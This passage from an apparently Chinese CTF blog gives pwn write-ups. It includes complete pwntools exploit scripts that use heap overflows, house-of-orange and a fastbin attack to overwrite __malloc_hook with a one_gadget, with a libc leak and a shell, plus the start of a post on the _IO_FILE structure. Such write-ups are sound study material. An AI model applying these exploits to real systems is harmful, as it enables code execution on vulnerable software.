onegadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf0364</span><span class="token punctuation">,</span> <span class="token number">0xf1207</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> motto<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your name:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your motto:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>motto<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your age:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input index:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input note size:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input index:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input index:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input index:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your note:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> motto<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your name:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your motto:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>motto<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your age:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>


register<span class="token punctuation">(</span><span class="token string">'l0ck'</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
libc_realloc <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>
one_gadget <span class="token operator">=</span> libc_base<span class="token operator">+</span>onegadget<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_realloc => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_realloc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
reset<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="0x6-Galgame"><a href="#0x6-Galgame" class="headerlink" title="0x6.Galgame"></a>0x6.Galgame</h3><p>一共有五个功能</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_4011E7</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDay %d:\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Send her a little gift."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Invite her to go to a movie."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. Confess to her!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. Collection."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5. Leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>第一个功能能够分配一个0x68的chunk</p>
<pre class=" language-c"><code class="language-c">qword_404060<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">-</span> v6<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x68uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>第二个功能是在0x68的chunk的末尾进行编辑</p>
<pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx >> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> qword_404060<span class="token punctuation">[</span><span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"movie name >> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   v4 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>qword_404060<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nHotaru: What a good movie! I like it~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[ You've gained a lot favor of her! ]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>所以这里存在堆溢出，可以修改下一个chunk的size</p>
<p>第三个功能分配一个0x1000的chunk</p>
<pre class=" language-c"><code class="language-c">qword_404098 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>第四个功能输出所有chunk的值</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token operator">-</span> v6 <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v11<span class="token punctuation">,</span> qword_404060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">++</span>v11<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>第五个功能往0x4040a0处读入八字节数据</p>
<pre class=" language-c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_4040A0<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"No bye!"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4040A0<span class="token punctuation">)</span> <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\n(='3'=)>daisuki~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">continue</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>分析完题目，我们发现程序并没有提供free功能，那么就需要利用house-of-orange，利用功能二的堆溢出修改topchunk的size，然后申请0x1000的chunk将topchunk放入unsortedbin，然后再通过功能一从unsortedbin中切割chunk，接着show一下，得到libc地址</p>
<p>topchunk的大小需要满足</p>
<pre><code>size&amp;0xfff</code></pre><p>我们申请了一个0x68的chunk后topchunk还剩下0x20d41，0x20d41&amp;0xfff=0xd41</p>
<p>有了libc地址该如何利用？</p>
<p>注意到edit功能并未对index检测越界，而leave功能读入的位置在管理chunk的数组下方</p>
<pre class=" language-assembly"><code class="language-assembly">.bss:0000000000404060 ; __int64 qword_404060[7]
.bss:0000000000404060 qword_404060    dq ?     
..................................
.bss:00000000004040A0 unk_4040A0      db    ? ;               ; DATA XREF: main+270↑o
.bss:00000000004040A0                             </code></pre>
<p>所以我们往0x4040a0处写入malloc_hook-0x60(因为edit是往chunk+0x60处写入的，我们要往malloc_hook写入onegadget就需要将chunk的指针设置为malloc_hook-0x60)，然后根据偏移得到0x4040a0的index为8，利用edit往malloc_hook写onegadget即可，exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Just_a_Galgame'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'Just_a_Galgame'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>
onegadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f365</span><span class="token punctuation">,</span> <span class="token number">0x4f3c2</span><span class="token punctuation">,</span> <span class="token number">0x10a45c</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">add_0x68</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx >> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'movie name >> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add_0x1000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leave</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'QAQ\n'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


add_0x68<span class="token punctuation">(</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xd41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add_0x1000<span class="token punctuation">(</span><span class="token punctuation">)</span>
add_0x68<span class="token punctuation">(</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ec2a0</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
malloc_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span>onegadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

leave<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
add_0x68<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/08/24/jia-mi-yu-jie-mi-xue-xi-1/">加密与解密学习-1</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-08-24</time></div><div class="post-content"><div class="main-content content"><script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/08/24/jia-mi-yu-jie-mi-xue-xi-1/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/">IO_FILE学习</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-08-14</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/IO-FILE/">IO_FILE</a></div></div><div class="post-content"><div class="main-content content"><p>本文用于记录IO_FILE的利用原理思路以及构造模板</p>
<p>首先我们知道内核启动的时候默认打开3个I/O设备文件，标准输入文件<code>stdin</code>，标准输出文件<code>stdout</code>，标准错误输出文件<code>stderr</code>，分别得到文件描述符 0, 1, 2，而这三个I/O文件的类型为指向FILE的指针，而FILE实际上就是<code>_IO_FILE</code></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _IO_FILE FILE<span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span><span class="token constant">stdin</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Standard input stream.  */</span>
<span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span><span class="token constant">stdout</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Standard output stream.  */</span>
<span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span><span class="token constant">stderr</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Standard error output stream.  */</span></code></pre>
<pre class=" language-c"><code class="language-c">_IO_FILE <span class="token operator">*</span><span class="token constant">stdin</span> <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>_IO_2_1_stdin_<span class="token punctuation">;</span>
_IO_FILE <span class="token operator">*</span><span class="token constant">stdout</span> <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>_IO_2_1_stdout_<span class="token punctuation">;</span>
_IO_FILE <span class="token operator">*</span><span class="token constant">stderr</span> <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>_IO_2_1_stderr_<span class="token punctuation">;</span></code></pre>
<p>_IO_FILE结构体定义如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_FILE <span class="token punctuation">{</span>
  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_file_flags _flags</span>

  <span class="token comment" spellcheck="true">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="token comment" spellcheck="true">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_ptr<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Current read pointer */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of get area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of putback+get area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of put area. */</span>
